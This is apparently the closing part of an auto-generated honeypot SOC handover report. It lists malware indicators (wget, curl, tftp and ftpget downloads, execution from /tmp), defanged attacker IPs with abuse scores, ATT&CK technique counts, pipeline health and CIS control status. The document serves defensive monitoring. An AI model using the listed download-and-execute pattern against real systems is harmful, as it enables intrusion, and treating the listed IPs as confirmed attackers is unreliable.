- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `8.152.99[.]77` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 17 |
| `31.173.0[.]46` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `115.86.227[.]79` | KR | HVYeongseo | **100** ⚠️ | 32 |
| `211.247.127[.]250` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |
| `111.171.127[.]190` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |
| `43.108.8[.]167` | KR | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 1 |
| `112.6.11[.]184` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `117.211.15[.]106` | IN | O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 50 |
| `92.62.74[.]41` | KG | Chui 121 | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 445 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 413 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 1 |

---

## 🔕 False Positive Summary (17 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 15 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 497 cases |
| Tool 34  | Credential Extractor        | ✅ 438 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 84 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 17 filtered (3.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 58 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 32 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 413 priority case(s) shown individually · 23 recon entry/entries in table (9 group(s) consolidating 53 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-19T11:12:25Z_
